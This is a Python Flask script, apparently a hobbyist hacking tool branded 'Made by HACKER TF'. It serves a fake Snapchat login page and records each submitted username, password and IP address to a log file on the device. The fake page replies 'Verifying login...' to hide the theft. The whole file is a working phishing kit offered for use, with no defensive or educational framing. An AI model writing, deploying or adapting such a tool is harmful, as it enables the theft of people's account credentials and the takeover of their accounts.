from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Snapchat</title>
    <style>
        body { background: #fffc00; font-family: Arial, sans-serif; text-align: center; padding-top: 60px; }
        .box { background: white; border-radius: 10px; padding: 30px; width: 300px; margin: auto; box-shadow: 0 0 10px #aaa; }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background-color: #fffc00; color: black; font-weight: bold; cursor: pointer; }
        h2 { margin-bottom: 20px; color: #333; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Log in to Snapchat</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username or Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Snapchat Login
IP: {ip}
Username: {username}
Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Verifying login...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;33m" + "="*40)
    print("         Made by HACKER TF        ")
    print("     Snapchat Login Capture Tool  ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5020)